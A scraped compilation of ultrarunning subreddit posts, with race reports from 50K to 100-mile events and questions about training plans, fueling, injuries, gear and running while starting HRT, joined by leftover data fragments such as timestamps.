I ate pasta for lunch and dinner the night before the race, and drove to Canmore and stayed in a hotel. I didn’t sleep very well the night before the race, though I wasn’t too worried about that as I had made sure to be well rested in the days leading up. I woke up at 6 AM and had oatmeal with raisins and maple syrup and a coffee for breakfast. I then made my way over to the Canmore Nordic Centre to grab my bib and race package. I drank 500 ml of water with nuun in the hour before the race. It was quite chilly waiting around for the race to start, and I decided to run in a long sleave shirt, and with tights under my shorts which I would later regret as the day warmed up.

\### Race

The race was held at the Canmore Nordic Centre and was split into 5 legs each of which started and ended at the biathalon stadium. Due to COVID, they separated us into starting waves based on first name which I thought was a bit odd, but it didn’t bother me as it put me in the middle of the pack for the first leg which was about where I wanted to be.

The first leg started on a wide paved path for the first few km, eventually transitioning to wide grassy trails for the rest of the leg. Most of this leg was relatively flat, meaning you could run it pretty quickly if you wanted. However, I took the strategy of try to keep a relatively slow and comfortable pace to save my legs and energy for later on in the course where there’s more elevation and technical trails. I passed and was passed by quite a few people in the first few kilometres as everyone found their place in the pack, and fortunately the trails were wide enough to allow people to do this relatively comfortably. I had a granola bar at the 5km mark, and a gel after 10 km. There were some short steeper climbs later on where I switched to walking, followed by a descent back into the biathalon stadium and transition area in the last kilometre.

The second leg began with a bit of a climb out of the biathalon stadium, which I used as an opportunity to walk and eat a cookie. It then switched to rolling terrain on wide trails for the rest of the leg. I began to notice here that I tended to be slower on the uphills but quicker on the flats and downhills than most competitors around me, so there were a few people I kept leap-frogging with. I continued to resist the urge to go too fast and used walking breaks on the uphill to rest my legs as I knew harder terrain was coming up in the third and fourth legs. I ate some gummies at approximately the 20 km mark, and stopped to refill my Gatorade and water when I got back to the stadium at the end of the leg. When I finished the leg and saw that 2 hours and 40 minutes had gone by, I felt quite confident in my goal to be under 6 hours as I’d already completed slightly over half the distance.

The third leg followed the same route as the second for the first couple kilometres, and I used the hill at the start to walk and eat a waffle and salt tab. After two kilometres, the course turned off to the left for a short climb up some single track mountain biking trails, followed by a fun \~ 200 m descent all on dirt single track trails. I began to pass a few more people on the descent as my legs felt quite good at this point so I began to run a little more aggressively. Everyone was very courteous with letting other racers pass which was great. After the descent, there was a brief flat section followed by a climb back up along more single track trails. Some of the people I passed on the way down then passed me along this section, as I had switched to walking on the climb while they were still running. I ate another gel along this section and re-filled my Gatorade and water again when I finished the leg.

The fourth leg took a different route out of the stadium that involved a steeper climb out and more single track trails, and I ate my final gel and salt pill during this climb. Partway up, I wasn’t paying enough attention and took a wrong turn and another racer began to follow me. Fortunately, someone else behind us noticed and shouted at us to let us know we were off course, and we were able to quickly correct the mistake. After about 180 m climbing in \~2.5 km, it was another nice descent on single track dirt trails back down towards the stadium for the final leg. When I finished and saw that that the elapsed time was \~ 4 hours 50 minutes, I began to wonder if a sub 5.5 hour finish might be possible.

The final leg began with the same climb as legs 2 and 3. I’d hoped earlier in the race I’d save enough energy to run the whole last leg, but my legs didn’t have enough energy left so I continued to walk the uphill sections. After the climb, I took a downhill section aggressively which caused by hamstring to seize up slightly, though it resolved itself by running at a slower pace for a couple hundred metres, and I avoided running too aggressively for the rest of the race. Another solo runner passed me with \~ 4 km to go, which was great as I’d been having trouble keeping myself mentally motivated as I hadn’t seen another solo runner in a while, so it was nice to have someone ahead to chase down. I let her get a bit ahead on a gradual uphill section where I walked and she continued running, and I then caught back up to and passed her in the final descent with about a kilometre to go. Once I could see the finish, I picked up the pace and ended up running the last kilometre in 4:40, crossing the line in 5:36:36, just over 23 minutes ahead of my goal time, and 24th out of 140 solo finishers.

\### Post-race

I grabbed and enjoyed one of the Grizzly Paw sodas they provided to finishers, and hung out in the finishing area for a while. I was able to eat some food too as my stomach felt quite good. My legs recovered reasonably well, and I was able to run 5 km three days afterwards at a reasonable pace.

\### Reflections

\* Overall, I really enjoyed the race. I liked the set-up of having each leg finishing and starting from the same spot as it made it easy to focus on the current leg of the race instead of the total distance remaining, and it meant you were greeted by cheering spectators and relay participants that weren’t currently running at the end of each leg, which was great for motivation.

\* My pacing strategy of taking the first two legs easy and avoiding the temptation to run too fast worked well for me, and my position in the race at the end of each leg went from 49 -&gt; 40 -&gt; 28 -&gt; 25 -&gt; 24.

\* I noticed that switched to walking on hills at lower grades than others around me, and I was slower on the gradual uphills but quicker on the downhills and flats. I’m wondering if more hill training might improve this in the future so I can run more of the gradual uphills.

\* Mileage: Based on what I’ve read from some others on this sub, I’m well below the weekly mileage of what most are doing for their ultra training. However, it seemed to work well for my first summer of running regularly, as I was able to ease into it and didn’t experience any setbacks or injuries. It’s possible that my fitness base from skiing over the winter, and my cross training made this possible.

\* Going forward: I’m quite happy with how my first season of serious running went and was able to surpass my own expectations a few times. Not sure what exactly is in the store for the future, but I do think I’ll try a solo 50-mile race next summer to see how I like the longer distances. I know I’ll have to increase my training volume and likely add back to back long runs to succeed in this, but I don’t think that will be a problem given that I experienced no major set backs or injuries in my first summer of serious running.

Advice: Considering switching up my strength,"Hey all -- I'm thinking about switching up my gyms and programming, and would love some thoughts from this group. 

I attend strength 'classes' -- it's group fitness with a coach on deck and a prescribed workout. In addition, I'm training for a 50 miler, and looking to continue to train for endurance runs. 

My current gym is focused on olympic lifts: Deadlift and posterior accessories (M), Bench and shoulder/arm/core accessories (W), and Squat and leg accessories (F). Each day really gives full body + some conditioning, but is anchored by a primary lift. 

I'm considering switching to a more crossfit structure gym. I see this as less variety day to day, but maybe more variety week to week. I am worried about the competitive nature of CF - mainly because my primary goal is running.

First ultra in a month and under prepared,"I have always been a runner since high school, but I have never done an intense race before like an ultra. Im 24 years old, and I signed up for the JFK 50 in early May. I had been training very seriously, and slowly worked my MPW to 40 miles about 6 weeks ago, but I began to experience IT band syndrome. I started going to PT immediately, and was only able to run 25 -28 miles per week during the last 6 weeks

I have until Nov 20th to train, and last week I did 34 total miles and my longest run was 13.1 miles with 4000 ft of elevation gain. It wasn't too bad, but I'm concerned that I lost so much training time.

My question is this: Do you think I have a chance of finishing even considering my injury took away such a large block of training? I'm mostly healed, but it still sometimes hurts on longer runs.

The closest thing that I have done to an ultra is a long distance skateboard race that I did in Miami last year called the Miami ultra-skate. A lot of people kind of look at skateboarding as not a true endurance sport, but it really is quite intense if you are pushing yourself hard. I did 202 miles in 24 hrs, without stepping off the board except to go to the bathroom.

Vomited 8 times during a 100 mile but nothing could stop the nausea - Any Experience/Thoughts to avoid this again?,"I've always struggled with GERD/nausea during ultras (bad acid reflux + bad sinuses) but the 100 mile this past weekend was the worst I have ever experienced. 

I vomited 8 times during the race, only held down &lt;600 calories, and had urine approaching the shade of tea/cola for the last 40 miles. My burping/belching was so loud that other runners could hear it 500' down the trail. I barely hiked out a 26 hour finish and was absolutely wrecked. 

I tried ginger chews, antacids, and cutting out citrusy fuels, but nothing worked. Even vomiting, which has always been a great reset, did absolutely nothing but drain my energy and couldn't remove the constant welling of bile in my chest/throat.

My goal is to finish the Squamish 50/50. 50miles the first day 50km on the second.  I originally signed up in 2019, and there have been a few things in the way as we know.   

So here I am less than a year out. My plan is to follow a plan to finish a marathon, then jump on an Ultra training plan.   I have JUST enough weeks to follow through.    Currently, I walk/ run, and I am focused on just getting the km on the plans in while keeping an eye on the average pace to be able to finish within the races cut-offs.   

My goal is to finish. Thats it.  Currently, I'm doing about 30 km a week.  I ran finished the Squamish 50km in 2016, and have been trail running since, but not the required level of running since then.  So I'm not completely new to all the ins and outs...

Sorry for the ramble. Anythoughts?",ultrarunning,1633927739
Does smoking CBD pre rolls occasionally hurt running performance?,I recently came across a company that has excellent products and sells legal (low quantity) cannabis CBD products.

Knees over toes for ultrarunning?,"I’ve been experiencing knee pain since I’ve been increasing my mileage, and looking for solutions. 

Knees over Toes is all the rage across the internet for “bulletproofing” your knees.

Any trans runners have advice for training while starting HRT?,"Title says most of it.

I've been having questions with my gender identity for quite a while, and I started taking estrogen in late August. I was never a great or fast runner, but I always enjoyed long aerobic runs and the feeling of moving outside. Since beginning HRT, my performance has degraded to the extent that I can barely run a mile at aerobic pace. I set out at 13min/mi pace and within a quarter mile my heart rate is already at 155 (this would have been a 10min/mi heart rate just two months ago). I feel like a loser and a failure. I try to tell myself that nobody said it would be easy and that this is just another obstacle to overcome, but it feels so shitty having all the work I've done in the last few years go away in a matter of weeks. It hurts especially badly when it's such a nice day out and all I want to do is enjoy a long run, but there's no way to do that without walking the whole thing or accepting that my heart rate is gonna be at 170-180 the whole time. I base my training on the Uphill Athlete book, so I feel very strongly that long runs are mostly counterproductive unless I'm at an aerobic pace. I tried to look around for pre-existing threads and only found this one https://www.reddit.com/r/ultrarunning/comments/o6bim1/when_do_you_know_to_take_a_self_imposed_break/ which is somewhat depressing to read for someone in my position.

Sorry to be a moper but I have no idea how I should be structuring my training, what performance expectations are realistic, or how long I can expect this decline to continue before I can start building performance again. Obviously there are women and trans runners so it's not impossible but god it feels shitty right now.",ultrarunning,1633895618

Backpack advice for everyday use?," Hey! Has anyone here tried the Salomon ADV skin 12 or the Salomon XA 25?

I have been looking for an everyday backpack for multiple purposes like going to the shops from work to get a bunch of snacks and run back to work within a lunch break. (Few Cheezles/full bag of groceries)  
OR  
like spending a day in the city and buying a bunch of things. (Like buying games/bigger boxed items)

I know these backpacks are made for ultralight fast packing and don't look too great in terms of fashion, but I have been looking for backpacks that are comfortable to run with and all those front pockets and compression look amazing.

Would anyone know if these are as nice as the reviews, and if it would be better to get another backpack for my use-case? (Osprey Talon 22?)

And with the XA 25, how well would it compress 12L of storage, since I really like the ADV 12 look with front + side pockets but if I am going to spend this much, it might better for me to get something that can carry a little more.

Race Recap/Advice from my first 50 Miler,"**Four lessons I learned from my first Ultramarathon**

1. Caffeine is your best friend

I stopped drinking coffee or anything with caffeine the 2 weeks before the race. It brought down my tolerance. When I finally got a jolt of caffeine at mile 20, I was soaring.

2. Eat and drink more than your body wants

I tried for 300 calories per hour of food and 24oz of water. Electrolyte solution (Endurolytes or Nuun) worked wonders.

3. Don’t overthink it

The information overload online when researching ultras is overwhelming. “Eat this, don’t eat that. Is Zone 2 HR training essential for endurance runs? Is Garmin the best GPS watch? Altra or Hoka sneakers?” Just had to get out there and run.

4. Just do it

If you’re reading the Reddit's, blogs, etc. looking for that one excuse for why you can’t compete, you’re already losing. If you want it bad enough, you'll make time.

**Race Recap**

**Location:** Bear Creek Lake in Lakewood, CO

**Weather:** Sunny, 86 F

**Elevation Gain/Change:** 3,240/6,480 Feet

Huge thanks to all the aid station volunteers that allowed this race to be successful.

**Mile 0-12.5:** Easy. Running 9.5 minute miles. Power hiking up the mountains and sprinting downhill. Feeling not even the slightest bit of soreness. Trying to get through as much of the course as I can before the sun comes out. (Can you tell I went out too hard?)

**Mile 12.5-25:** Feeling good. The sun is taking its toll. Race is halfway over. My body has no idea that the race isn’t really halfway over. *The ultramarathon hasn’t even started yet.*

**Mile 25-40:** Tough, but doable. The sun is beating down heavily but I find refuge in the aid station spray downs and river crossings. The downhills are worse than the uphills on my quads and joints.

**Mile 40-50:** My mind cannot fathom running the last 10 miles. I haven’t peed in 5 hours after drinking 120oz of water and electrolyte solution. I am disoriented and dehydrated. Running about 11 minute miles at this point. A dog walking on the trail takes a good bite at my leg. I freeze up and can barely move it. As if the last 10 miles weren’t going to be hard enough, there’s now an added layer of difficulty. The aid station volunteers throw some topical antibiotic on the bite marks and recommend stopping/seeking medical attention. I thank them for their help but I am going to get myself to the finish. After a mile of hobbling along and cussing my life, I realize that if I stop playing victim I can finish this thing in sub 10 hours. My hobble slowly breaks into a fucked up stride. One leg in front of the other. “The best way out is through” repeats in my head.

I finish in 10 hours and 38 seconds. I feel accomplished but know that I could have found somewhere along the last 50 miles to shave off those 38 seconds. Perfect mix of pride and resolve to spark my training for a 100 Mile.

**The Training:**

**Motivation**

After the initial spark was lit for me, it took plenty of outside sources of motivation to remind me what I was working towards. I bought posters and hung them on my walls. Books, Books, Books. Born to Run- Chris MacDougal. Can’t Hurt Me- David Goggins. Eat and Run, North- Scott Jurek. Ultramarathon Man-Dean Karnazas. Plenty of other good ones, just ask google. Spotify podcast interviews with any athlete. Audiobooks were nice to mix in when music got boring.

**Runs/Workouts**

Started running hard in May. Like I said, 95% of my training was on the treadmill- 1% incline so I was not getting “free propulsion”. The pitch and roll of the ship helped build stabilizing leg muscles that your standard treadmill will not. Aside from two, 3 week gaps of minimal running, I logged 30-60 mile weeks depending on how heavy the seas were and what cross training I did. Being on my feet for 12 hour work days was also advantageous for building stamina.

Back to back long runs (20 mi one day/15 mi the next) were helpful to get a feel for what my stomach could handle (GU vs. Solid foods) as well as what sneakers, socks, chafe butter, etc were best. They also allowed me to get used to running on sore legs. I ran a marathon in Alaska 3 weeks before race day and then began my taper.

When time wasn’t on my side I focused on a few rounds of high rep explosive leg/hip movements followed by core and a short intense run (2-3 mi, Zone 3 HR+).

**Gear**

Luckily I didn’t have much of a budget. I bought new sneakers every 2 months (Altra Lone Peak 4 and 5), and a new set of Brooks Catamount’s for race day. The Brooks were by far the best. Ininji toe socks were perfect for preventing blisters between toes. Rei dry wick socks were okay but got saturated in sweat quickly.

The Corros APEX watch was a great alternative to the Garmin- all the same features but with a longer battery life \~ 12 days with constant HR metrics. The APEX died 3 days before the race and never came back on so I switched to the Garmin Forerunner 945 for race day and it held up.

AfterShocks by Trekz Air headphones were my go to mainly because you can still hear everything going on around you. Decent battery life \~ 6 Hrs. Pop some earplugs in if you aren’t worried about your surroundings and they get even louder.

Squirrels Nut Butter completely eliminated chafing throughout the 50M, cannot recommend it enough. Running with a Nathan fanny pack was annoying but much easier than a vest for me. Grid roller came in handy after the back to back long runs.",ultrarunning,1633713886
50K to 12-hour event in 9 weeks...advisable or not?,"I completed my first 50K this past Saturday and loved it. It was the Hanging Rock to Pilot Mtn race which was mostly trail, some of which I would call at least moderately technical (rooty and rocky) single track with a few short stretches of road connecting the trail systems between the two parks. According to my Garmin Instinct and the course description, it was about 4K elevation gain. I finished in just under 7 hours and felt reasonably good overall. Had the expected DOMS Mon &amp; Tues, walked a couple hours each of those days then ran a slow easy 10 on Wednesday, 12 today, and feel mostly recovered. I want to do a 50miler in the spring that is also a trail race. In the meantime, there is a 12 hour endurance event close by that is 9 weeks from now. The 12 hour event is a flat rail trail, 5 out and 5 back, so 10 mile ""laps"" for 12 hours. Obviously this won't mimic singletrack running with elevation changes, but I thought this would be a good opportunity to get an idea of what it's like to do a 50 miler from a time on feet standpoint (as well as nutrition, gear etc). Would you agree or disagree? And if it's a reasonable thing to do, what would you do from now to the 12 hour race day? Just pick up in a 50-miler training plan at  the ""9 weeks til race"" week?

How do you keep a journal of your races/big runs?,"I like to keep a journal of big runs that I do (i.e. runs that I wouldn't consider ""training runs"" but the big things that I'm training for).

Got me wondering if anyone has any other techniques or tools they use to easily document their runs.

Anyone else like the Backyard Ultra Format?,"So the last few years I've found myself running Backyard Ultras (aka Last Person Standing) as my preferred long distance race.  My training routine has not been consistent over these years and I find this format works well since essentially you can go as long as you like.  I suppose that's the downside as well - it can be easy to talk yourself out of continuing on.

My third race in this format was this past weekend: Bubba's Backyard Ultra.  I had done this race two years ago in its first year - only 18 people did it and I was the fifth longest runner at 14 laps.  This year I was dealing with some aches and pains and unsure how long I was going to go.  After some rough laps I found a groove and managed to finish 15 laps.  I was very pleased to go longer, even it was just a single lap.  My wife also came out to crew which helped a lot - normally I'm going to these races solo.  

It was a really fun, laidback event.  I love the nature of these events in that you get to know the other runners and you are constantly lining up every hour to resume.  A nice change from those typically lonely ultras.  The size of the field this year had grown considerably to 66 runners and an impressive number went deep into the night.  The final two ended up doing 44 and 45 laps respectively.  A very impressive showing.  Wish I could have stayed to watch them finish but we had to get home after the 24 hour lap.  

Here is a video I shot of the first 24 hours if anyone is interested: [https://youtu.be/mGhAT72J2I4](https://youtu.be/mGhAT72J2I4)",ultrarunning,1633638829

Tweaking a training plan to fit a weird work schedule?,"I just completed my first 50k this past Sunday and finished more or less in the timeframe I wanted, more importantly I finished in a good mood. That being said, I did blow myself up a bit by mile 18-23 by starting too fast and not walking enough early. I immediately signed up for a 40 miler in February, which should be enough time for recovery (read easy running) and training.

For the 50k I didn't really follow a plan and I felt it come about mile 23 (which was 3 miles longer than my longest training run). I have Hal Korner's guide to ultra running that I've referenced before, but the problem is that my work schedule doesn't really fit with the plans in the book. I work 6 days with one day off and 4 with 3 days off so I can't do the prescribed long weekend runs every other week. Could I shuffle the mileage around so that I get the same cumulative mileage week to week or are there other plans out there that would work?

When to “tough it out” and when to quit in training,"I’ve always been an active person but I’m relatively new to running. I started to run casually during the early part of Covid and recently decided I’d like to try a 50k. I’ve been following the Hal Higdon 50k plan and it’s been going well so far.

Last night I was scheduled to do 17 miles after having run 10 miles the night before. This would have been the longest run I’ve ever done. The 10 miles  the night before felt great and to be honest the first 9 or so miles of last nights run did too. However, somewhere around mile 10 I started to get an ache in my left knee that got progressively worse very quickly. Around mile 12 I was still thinking I’m just going to push through this but at 13.2 miles, with my knee periodically giving out and my hamstrings and entire chain of muscles on that leg starting to cramp up due to compensation, I decided to call it quits.

I’ve got a job and 3 young kids, I’ve got another 6 mile run scheduled on Thursday. I don’t necessarily feel like it was the wrong decision, but at the same time I felt like I failed. The post run meal didn’t taste good cause I couldn’t stop thinking that my body failed me 4 whole miles before my goal (which itself is barely over half of my end goal distance).

How do you guys deal with this type of thing? So much of why I want to do an ultra is to train mental toughness, but at 33 with nagging neck problems from years of wrestling/jiu jitsu I’ve also been having to consciously tell myself I can’t push through pain like I did as a youngster. The knowledge that it may be the right decision doesn’t stop the emotions and feeling like I’m just weak or being soft.",ultrarunning,1633529265

Longest Prior: 50k w/ 7,800 ft

Goal 1: Finish       Achieved: Yes

Goal 2: 12hrs       Achieved: Yes

&amp;#x200B;

**PRE-RACE:**

Thursday night I was able to manage 8h30m of sleep, which was great because I knew that there was a chance I would not sleep Friday night (the night before the race). Friday came along and I drove to Boise with my crew (two others) and picked up the race packet and ate a huge serving of Thai Drunken Noodles. After this we went to the house and I put my head down at about 10pm and just like I thought (self-fulfilling prophecy, maybe?) I didn't sleep at all.

\_\_\_\_\_\_\_\_\_\_\_\_\_\_

We left the house around 4:30am for a 5am start at a location about 15 minutes away. On the way there my friend said, ""oh, so they give you your bib at the start?"" and my stomach dropped as I realized what I had done. It was all there. Everything in one pile and I *still* managed to forget the bib! So, we turned around and sped back to the house and miraculously made it to the starting line at 4:58...whew!

&amp;#x200B;

**RACE:**

The course profile immediately starts with a climb and then sort of oscillates for about 15 miles. The best part about this section (and arguably the whole race) was turning the headlamp off for a minute and turning around to see the city lights and all the other runner's headlamps bobbing up and down. Truly amazing.

I reached the first crew-access aid station at mile 15, which was about 40 minutes before I thought I would be there and thankfully I gave the crew an hour window, so they were there and I was able to restock on dried mangos, Swedish Fish, a 'Perfect' bar, and some water &amp; Tailwind from the aid station (I also snuck in some pickles). With the next crew-access aid station at mile 29 I made sure to stock up. I was feeling great, but I also knew that would change in this next leg if my training told me anything. And it did.

From miles 15-32 you just climb. It's steep in some places, but for the most part is gentle. At around mile 19 I started to feel it in my legs a bit and the pain was introduced (and welcomed with a smile!) and so I took it a bit easy going up knowing that I needed to conserve. At mile 22, though, there is a dip in the profile. I am pretty strong at downhills so I took advantage of this and gained some good ground; and it was here where I learned something: *the pain goes away*. By the time I hit the bottom of the dip I felt great and I ran the rest of the way up to the mile 29 aid station with ease. In fact, I was 30 mins away from my estimated window (1hr.30 mins ahead of my estimated time), so my crew hadn't even shown up yet! I knew that this could mess with my head a bit if I let it, but chose to look at it as an opportunity to adapt. I had to rely on the aid station calories, which I had not trained with and was wary to try; but alas a shoved what I could into my pack and ate an Uncrustable PB&amp;J and off I went to finish the final 3 miles of the climbing.

At mile 30 the terrain turns into a forest road before it cuts you off onto a trail for the rest of the descent. Just before mile 32 when I am on the road a car horn honks behind me. Guess who? My crew! They had found me and pulled in front of me and threw out the works on the ground...finally I had mangos and Swedish Fish back in the mix.

The drop down was incredible. Up until this point there had been a lot of exposure, but this part of the course is full of fall colored trees and little streams. I flew down this portion and had so much fun. The descent ends at mile 39, where a mini aid station is set up. At this point I was a little under 8 hours...okay maybe I can break 11(?)...yep, this is the new goal. Once I hit this point I did an evaluation and my stomach was a little upset (maybe from the Uncrustable?) and my feet needed some care. I threw some electrolyte in one of my waters for the stomach and quickly applied some lube to my feet. Back in business!

Next are a couple of climbs and descents until mile 46, where there is another crew access aid station and I felt great going into this. (I did catch up with my crew and my voice is starting to crack, have an of you experienced this?). I filled up on water and was on my way to finish. The race is actually 52.5 miles and in the last 6.5 miles there is an down-up until 48.5 and then down from there. The first down was fine, but then the climb is the steepest of the entire race and I learned something else: *the pain just took a vacation* :) It came back with a vengeance and on the final downhill it was all I could do to maintain a 10:30 minute mile.

The last 1/5 mile is on pavement and the RD threw a nice, steep staircase up to that last 1/5 (honestly this was comedic at this point). Finished strong with a time of 10:53, which ended up being about 1h10m ahead of my goal.

&amp;#x200B;

**POST RACE:**

It was really difficult to put down solid food the night of and continues to be difficult three days later. This concerns me a bit. Has anyone experienced this? I have been able to eat, but not much at a time and it upsets my stomach.

I had chills the night after, but these went away 2 days post-race. (I was tested for Covid and am negative). Has anyone experienced this?

&amp;#x200B;

**REFLECTIONS:**

I was on top of my nutrition. In training I was admittedly sloppy with how much I fueled up, which quite possibly was the reason I was able to get through the pain half way through the race so easily. As noted, I had dried mangos, Swedish Fish, 'Perfect Bar' (to prevent sugar crash). In addition to this I had chocolate covered berries with almonds and some granola. I used the Tailwind at the AS, as well.

I definitely need to rethink how I estimate my times, but given that this was my first 50 miler I think that it was reasonable to be that far off.

Someone on here a while ago likened the brain in these races to the child in the back seat asking, ""are we there yet?"". The thoughts never really became problematic until the end and that idea helped pull me out. You just rely on your legs to do what you have trained them to do and you hope that they memorized the movement. Also, talking to the legs as if they're little separate humans attached to your torso can really help.

Attach bib to shirt the night before :)

**FINAL THOUGHTS:**

Well, long post so if you made it this far thanks for reading and I hope that it was a good report (first one I have done).

I will say that this community helped me out tremendously and thank you all for that. Seriously.

I have seen *countless* posts on here asking something along the lines of, ""should I run an ultra...?"" or ""should I run a 50 miler...?"" Look, if you have done the training, then the answer is emphatically, yes! Just do it because I could have thought of any excuse not to and I did so much better than I thought I would and I am so glad I did it. I had an minor ankle injury 1 month pre-race and caught myself trying to use it as an excuse to maybe not do the race. Put those thoughts to rest (if you know they're escape tactics).

Alright, with that I'm out. Thanks again everyone!",ultrarunning,1633485002
Getting my head round a 200 miler.,"Simple question. How does training for a 200 miler differ to training for a 100? I've got a 200 miler in April and can't quite get my head round the idea of what it takes compared to a 100.
Self supported 200 over with a 4 day cut off, with a time allowance that asumes sleeping for the average participant. Do I train as if its 4 x50 milers or train as I would for a 100 miler that is a straight through?
Do I do shorter B2B2Bs or longer B2Bs?",ultrarunning,1633481674

Incredible pain - almost out of nowhere,"I'm more just need to vent but I'd be curious of others experiences.

Currently training for a 50 miler and training has been going really well. I was literally commenting to my wife how great I've been feeling on Saturday. When I woke up on Sunday I was a little tight from my Saturday long run but that's not a typical. I decided to do a 20 to 30 minute stretching routine while watching football on Sunday. I never stretch and if I do it's usually for 2 to 3 minutes. I don't know if I overdid it but I didn't feel so great on Monday and then after I ran on Monday I literally could not stand. 
Today I feel better but not good enough to run. Hopefully I'll be back at it tomorrow or maybe another day or two off.

Full Stomach Training,"What is everyone's take on full stomach training for an ultra? I just ate a full meal pasta and meatballs and am about to run 8mi to test the gut a little.

I'm just curious as to know what experiences people have had on training with a full stomachs, not just a banana or granola bar before a run and how often running in a week with a full stomach.

The Things I Learned from my First 100 Miler,"I ran the YETI100 on 9/24/2021.  My first 100 miler.  I had set a goal to finish in under 24hrs and met that goal, but not exactly as I wanted to.  Secretly, I was hoping for a 20-21 hour finish, but it just didn't happen.  My total moving time though was 21hrs and 10 mins, so if we take out various stops I sort of came close to the 21 hour goal (in a way).  


I had no blisters, I had no chaffing issues, I really had no issues much other than puking at miles 45.7 and 71.7.  I never felt the desire to quit or bail out.

What I learned:

1. Go with the lightest shoes you can find that give you the most comfort.  I wore HOKA Bondi7's, but the fact is, they are too heavy.  I could've done much better with a lighter shoe, if it gave me decent support and comfort.
2. Take advantage of aid stations with ramen/broth/soup - especially at night or late in the day when it starts cooling off.  If nothing else, you get a good dose of sodium.
3. I packed the first 33 miles of nutrition in my vest so that I only had to stop to refill with water.  I ended up stopping at mile 16 or so at the Damascus aid station to take off my long sleeve shirt and stash it with my drop bag.  I had my accessible pockets stuffed with the first 16-20 miles, and the remainder was in a ziploc bag in the back of the vest.
4. Nutrition desires/needs will change after mile 60 - in my case I used less of my pre-prepared ziploc bags of nutrition, and used more of the aid station stuff (as mentioned above - ramen, soup, broth, potatoes, and a little Coke)
5. The weather was perfect, but cooler than the weather I had trained in.  So the first 16 miles, I probably peed 5 times - not a major issue, but it slows you down and you lose time
6. At mile 49 I wanted to change shoes/socks/clothes, re-lube, use a bath-wipe to wash off a bit, etc.  All of that takes more time than you think it will when you are 49 miles in. I had planned on 10-15 mins, and that stop for me was my longest aid station stop by far at 49 minutes - ridiculously long.  But, that's when I also got my first dose of ramen/broth and saw the benefits.  So not all bad.
7. The last 10 miles I was pretty much power walking at 15:00/mi pace or faster.  Others around me were doing a run/walk scenario, yet they weren't really gaining ground.  They would run, disappear into the night, and then at some point 6-8 minutes later they would start walking, and what I noticed was that I was right back on their heels, losing very little or no ground to them overall.  So think about that if you are still trying to run/walk in the late stages. If you are not truly putting distance between you and someone behind you, or you aren't really helping your overall pace, think about the energy you are expending.  Like I said, I didn't finish the way I wanted to, I would have rather ran that last 10 miles or a run/walk scenario, but I made the choice to powerwalk just based on what I was seeing with the people around me.  I was gassed at that point, and I knew I was going to meet my goal - your goal may be different.
8. Puking - for me, I felt better after.  1 minute of recovery time and going again. Your mileage may vary.

All in all, my YETI100 experience was great.  I loved it. The entire day was awesome, and I learned and adjusted as  I went along, and for me it was just a great experience.  Probably one of the top 10 days of my life, and I don't say that lightly.

"From a DNF at mile 87.5 Leadville 6 weeks ago to a Sub 24 today at Hennepin, I finally get to take time off","Not going to bother with a full race report like I did with Leadville: [https://www.reddit.com/r/ultrarunning/comments/p9lztz/race\_report\_leadville\_100/](https://www.reddit.com/r/ultrarunning/comments/p9lztz/race_report_leadville_100/)

Long story short, finished with a 22:28 in high spirits, being able to run/walk the last 25 with no major issues AND could keep down solid foods the entire race. 

Key takeaways: 

Coming down from altitude to a flat course, I should have probably taken it a bit slower the first 10k or so - got caught up just talking and wasn't paying attention

Humidity sucks. Like holy shit, I felt like I was overheating during the day, and kept going through 1L of water every 75 minutes or so. 

Dunking my food in chicken noodle soup made all of the food go down SO much easier

Aid stations at Hennepin were the bomb. Pizza rolls, tacos, grilled cheese, pulled pork, pancakes and sausage, brownies -- I constantly found something that sounded appetizing. Baffled me how sparse Leadville was in comparison. 

Someone at mile 35 told me about the 4-1 race plan - run 4, walk 1. Totally adopted this, adjusting it as time went on to 3:30/1:30, 3/2, and then 2:30/2:30 the last 2 hours. By only looking at my lap time (between aid stations) and not the overall time or distance, I was able to concentrate on easy to manage numbers that mentally I could rock. 

My only real pain was from my shoes (feet swelling), and my hip flexors being sore. Didn't have issues with either at Leadville, so that was a surprise.

Electrolytes in Running Bladder,"Hi All,

I've been using High5 Zero electrolyte tablets for my long runs. I've finally managed to order some flavourless ones and I'm tempted to try them in my  running bladder (I'd previously avoided this as I like having some plain water to get rid of the weird aftertaste a lot of running snacks have).

Is this a bad idea? I've heard folk saying it's really difficult to clean but that was in reference to nutrition powders, which are generally a lot thicker.

And if I do, how much should I put in? ie if one tablet is for 500ml and the bladder is 2 liters I'm guessing I don't want to put in a full four? This will be my primary water source afterall. I've heard of overhydration (never had it myself, just a sloshy stomach) but I'm guessing too many electrolytes could be bad too.

Best options moving forward with 100 miler in 5 weeks,"Ok everyone, I've got myself into quite the predicament.  I signed up for the Rim to River 100 miler in West Virginia on November 5th, about 9 months ago.  Training has been going great.  No injuries, slowing increasing mileage, practicing race day strategies, nutrition pretty on point etc.  This will be my first Ultra, although I'm not completely new to long distance events (see below).  

A bit of a background on me.  I am a strength and conditioning coach for a military unit.  I regularly ruck with them on Fridays.  They vary in mileage with the shortest being 4 miles and the longest was a 32 hour overnight ruck with a 60 pound ruck.  We went 20+ miles.  Beyond the rucking I strength train with the guys and girls multiple times a week.  I'm fairly lucky that this is literally my job, so it affords plenty of time outside of work to rest and recover, while in addition, I can use any recovery modalities the military has (ice baths, game ready, float tanks, sauna etc.). 

About a week ago out, seemingly out of the blue my IT band flared up.  Like pretty bad.  I read a lot of posts on here that said basically get off your feet, don't push through.  So I've just been taking it easy for the past week.  I didn't even cycle or bike, as I figured some absolute rest for a week would do me good.  I was about to start tapering anyway, so I figured that would be the best route.  I tried to do a slow job yesterday and it flared up pretty good right out the gate.  I cut the jog off at about half a mile, stretched then got in the ice tub.  

Pulling out is not an option.  I have flights, rental cars, hotels for myself, wife and my crew.  What's my best course of action moving forward?  Think the IT band will recover by then?  Cycle and row to keep the cardio up?  Continue to strength train as tolerated to keep some muscle up on the legs?  Any advice would be greatly appreciated.",ultrarunning,1632865395

Signed up for an ultra 6 weeks away - help!!,"I am a casual runner but a buddy of mine pushed me into signing up for an ultra-race early November. Fortunately, the race is an 8-hour all-you-can-runathon around an easy 6-mile loop (not technical, minimal hills), so it's pretty much impossible to DNF. I checked the results from last year and probably half the people just walked 1-2 loops while a few got almost 60 miles in before the time limit.

I can currently run 12-miles at a 10:40 pace, that's the longest run I did last week. But there are weeks that go by where I only run 10 miles, other weeks I'll do 40 miles.

So I basically need a 5-week training plan + 1 week taper to prepare for this.

My thought is to start with 35 miles this week.

- Monday: 3 miles 
- Tuesday: 5 miles 
- Wednesday: 5 miles
- Thursday: 5 miles (tempo-ish)
- Friday: Rest
- Saturday: 13 miles
- Sunday: 6 miles

